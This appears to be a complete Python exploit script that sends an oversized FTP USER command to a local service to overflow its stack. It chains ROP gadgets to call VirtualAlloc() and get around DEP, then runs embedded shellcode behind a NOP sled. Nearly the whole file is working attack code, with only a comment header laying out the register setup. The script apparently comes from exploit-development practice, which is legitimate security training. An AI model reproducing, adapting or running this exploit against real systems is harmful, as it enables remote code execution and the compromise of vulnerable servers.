#----------------------------------------#
# ROP Chain setup for VirtualAlloc()     #
#----------------------------------------#
# EAX = NOP (0x90909090)                 #
# ECX = flProtect (0x40)                 #
# EDX = flAllocationType (0x1000)        #
# EBX = dwSize                           #
# ESP = lpAddress (automatic)            #
# EBP = ReturnTo (ptr to jmp esp)        # 
# ESI = ptr to VirtualAlloc()            #
# EDI = ROP NOP (RETN)                   #
#----------------------------------------#

import socket, struct

def p32(x):
    return struct.pack("I", x)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 21))

shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

rop =  p32(0x7cb1c0cd) # POP EAX # RETN
rop += p32(0x90909090) # rop ???
rop += p32(0x7c9c12a4) # kernel32!virtualalloc
rop += p32(0x7ca35bad) # MOV EAX,DWORD PTR DS:[EAX] # RETN    
rop += p32(0x7c9fdcc7) # XCHG EAX,ESI # RETN  
rop += p32(0x7cb1c0cd) # POP EAX # RETN
rop += p32(0xffffffc0) # NEG to 0x40
rop += p32(0x7ca82542) # NEG EAX # RETN
rop += p32(0x7cb4e1d7) # XCHG EAX,ECX # RETN 
rop += p32(0x7cb1c0cd) # POP EAX # RETN
rop += p32(0xfffffdff) # NEG to 0x201
rop += p32(0x7ca82542) # NEG EAX # RETN
rop += p32(0x7c9e7cd8) # XCHG EAX,EBX # RETN 0x0C
rop += p32(0x7ca7a60b) # XOR EAX,EAX # RETN
rop += p32(0x41414141) # filler
rop += p32(0x41414141) # filler
rop += p32(0x41414141) # filler
rop += p32(0x7cb1c0cd) # POP EAX # RETN
rop += p32(0xffffefff) # NEG 0x1000
rop += p32(0x7ca82542) # NEG EAX # RETN
rop += p32(0x7e43fde7) # DEC EAX # RETN
rop += p32(0x7c9c169c) # XCHG EAX,EDX # RETN
rop += p32(0x7c87fac8) # POP EBP # RETN 
rop += p32(0x7e429353) # &jmp esp
rop += p32(0x7caa8d12) # POP EDI # RETN 
rop += p32(0x7c9c1eb0) # RETN 
rop += p32(0x7cbba4a4) # PUSHAD # RETN 

p = "A" * 2005
p += rop
p += "\x90" * 20
p += shellcode 
p_final = "\x90" * (2100-len(p))

s.send("USER " + p+p_final + "\r\n")
s.close()
